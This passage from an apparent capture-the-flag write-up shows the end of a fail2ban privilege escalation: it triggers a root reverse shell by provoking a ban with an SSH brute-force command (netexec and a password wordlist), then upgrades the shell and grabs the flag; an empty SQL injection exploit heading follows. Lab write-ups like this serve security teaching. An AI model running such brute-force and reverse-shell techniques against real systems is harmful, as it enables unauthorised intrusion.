> [ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
> ```
>

All that remains is to get banned by the target in order to trigger the action, which is the *reverse shell* command

To do so, just perform a *bruteforce* attack via *SSH* using ***[Hydra](https://github.com/vanhauser-thc/thc-hydra)*** or ***[Netexec](https://github.com/Pennyw0rth/NetExec)***

```bash
nxc ssh 10.129.227.180 --username 'test' --password /usr/share/seclist/Passwords/months.txt
```

And we will receive the reverse shell from the target when the ban takes effect

Next, we must carry out a *[[TTY, PTY UPGRADE|PTY Upgrade]]* to prevent to kill the *spawned pseudoterminal* when we press *C-c* to send a *SIGINT* to a certain process on the *target*

```bash
script /dev/null -c bash
C-z
stty raw -echo ; fg
reset xterm
export TERM=xterm-256color
export SHELL=/bin/bash
. /etc/skel/.bashrc
```

Finally, grab the content of the *root.txt* flag and move on the next target! 😊

---

#### *Custom Exploits*

##### *SQL Injection*

> [!BUG]- *SQLInjection.py*
>
> ```python
>
> ```
>